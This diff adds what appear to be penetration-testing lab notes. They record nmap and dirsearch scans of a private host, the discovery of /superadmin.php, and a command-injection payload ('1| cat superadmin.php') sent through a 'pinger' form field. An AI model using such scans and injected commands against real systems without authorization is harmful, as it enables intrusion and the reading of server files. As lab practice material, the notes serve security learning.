@@ -1,0 +1,108 @@
+
+└─$ nmap -sV -A -p 80 172.16.33.49
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-28 02:16 EDT
+Nmap scan report for 172.16.33.49
+Host is up (0.037s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.34 seconds
+
+
+└─$ sudo dirsearch -u http://172.16.33.49
+[sudo] password for kali: 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                     
+ (_||| _) (/_(_|| (_| )                                                                                                                              
+                                                                                                                                                     
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/kali/reports/http_172.16.33.49/_24-04-28_02-19-43.txt
+
+Target: http://172.16.33.49/
+
+[02:19:43] Starting:                                                                                                                                 
+[02:19:46] 403 -  277B  - /.ht_wsr.txt                                      
+[02:19:46] 403 -  277B  - /.htaccess.bak1                                   
+[02:19:46] 403 -  277B  - /.htaccess.orig                                   
+[02:19:46] 403 -  277B  - /.htaccess.sample
+[02:19:46] 403 -  277B  - /.htaccess.save                                   
+[02:19:46] 403 -  277B  - /.htaccess_sc
+[02:19:46] 403 -  277B  - /.htaccess_extra                                  
+[02:19:46] 403 -  277B  - /.htaccess_orig
+[02:19:46] 403 -  277B  - /.htaccessBAK
+[02:19:46] 403 -  277B  - /.htaccessOLD
+[02:19:46] 403 -  277B  - /.htaccessOLD2
+[02:19:46] 403 -  277B  - /.htm                                             
+[02:19:46] 403 -  277B  - /.html                                            
+[02:19:46] 403 -  277B  - /.htpasswd_test                                   
+[02:19:46] 403 -  277B  - /.htpasswds
+[02:19:46] 403 -  277B  - /.httr-oauth                                      
+[02:19:48] 403 -  277B  - /.php                                             
+[02:19:52] 200 -  417B  - /admin                                            
+[02:20:13] 403 -  277B  - /server-status/                                   
+[02:20:13] 403 -  277B  - /server-status                                    
+                                                                             
+Task Completed               
+
+#80: index.php found nothing, as well as /admin 
+
+└─$ sudo dirsearch -f -e php -u http://172.16.33.49
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 14331
+
+Output File: /home/kali/reports/http_172.16.33.49/_24-04-28_02-31-22.txt
+
+Target: http://172.16.33.49/
+
+[02:31:22] Starting: 
+[02:31:25] 403 -  277B  - /.ht_wsr.txt
+[02:31:25] 403 -  277B  - /.htaccess.bak1
+[02:31:25] 403 -  277B  - /.htaccess.orig
+[02:31:25] 403 -  277B  - /.htaccess.save
+[02:31:25] 403 -  277B  - /.htaccess.sample
+[02:31:25] 403 -  277B  - /.htaccess_extra
+[02:31:25] 403 -  277B  - /.htaccessBAK
+[02:31:25] 403 -  277B  - /.htaccess_orig
+[02:31:25] 403 -  277B  - /.htaccess_sc
+[02:31:25] 403 -  277B  - /.htaccessOLD
+[02:31:25] 403 -  277B  - /.htaccessOLD2
+[02:31:25] 403 -  277B  - /.htm
+[02:31:25] 403 -  277B  - /.html
+[02:31:25] 403 -  277B  - /.htpasswd_test
+[02:31:25] 403 -  277B  - /.httr-oauth
+[02:31:25] 403 -  277B  - /.htpasswds
+[02:31:25] 403 -  277B  - /.php
+[02:31:29] 200 -  417B  - /admin
+[02:31:42] 403 -  277B  - /icons/
+[02:31:53] 403 -  277B  - /server-status/
+[02:31:53] 403 -  277B  - /server-status
+[02:31:56] 200 -  132B  - /superadmin.php
+
+Task Completed
+
+
+/superadmin.php #this is a web subjected to command injection 
+
+
+    under superadmin.php
+
+
+        1| cat superadmin.php
+
+
+
+        10.8.0.234 submitt
+        pinger=10.8.0.23444444444&submitt=Submit+Query
+        
